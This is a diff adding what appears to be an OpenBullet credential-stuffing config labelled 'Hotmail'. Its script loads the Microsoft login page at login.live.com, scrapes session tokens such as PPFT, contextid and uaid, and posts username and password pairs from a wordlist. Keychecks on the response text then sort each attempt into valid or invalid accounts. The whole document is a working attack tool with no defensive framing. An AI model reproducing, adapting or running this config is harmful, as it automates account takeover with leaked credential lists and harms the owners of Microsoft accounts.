@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Hotmail",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-22T18:55:06.0150099+03:00",
+  "AdditionalInfo": "",
+  "Author": "Octavia",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_LOGIN REQUEST GET "https://login.live.com/login.srf" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#contextid PARSE "<SOURCE>" LR "https://login.live.com/login.srf?contextid=" "&" -> VAR "contextid" 
+
+#bk PARSE "<SOURCE>" LR "&bk=" "&" -> VAR "bk" 
+
+#uaid PARSE "<SOURCE>" LR "&uaid=" "\"/>" -> VAR "uaid" 
+
+#pid PARSE "<SOURCE>" LR "&pid=" "'" -> VAR "pid" 
+
+#PPFT PARSE "<SOURCE>" LR "name=\"PPFT\" id=\"i0327\" value=\"" "\"/>'" -> VAR "PPFT" 
+
+#Login REQUEST POST "https://login.live.com/ppsecure/post.srf?contextid=<contextid>&bk=<bk>&uaid=<uaid>&pid=<pid>" EncodeContent=TRUE 
+  CONTENT "i13=0&login=<USER>&loginfmt=<USER>&type=11&LoginOptions=&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=<PASS>&ps=&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=<PPFT>&PPSX=Passpor&NewUser=&FoundMSAs=&fspost=&i21=&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=&i19=187165" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your account or password is incorrect." 
+    KEY "That Microsoft account doesn\\\\'t exist." 
+  KEYCHAIN Success OR 
+    KEY "name=\\\"t\\\" id=\\\"t\\\"" 
+    KEY "JavaScript required to sign in" 
+
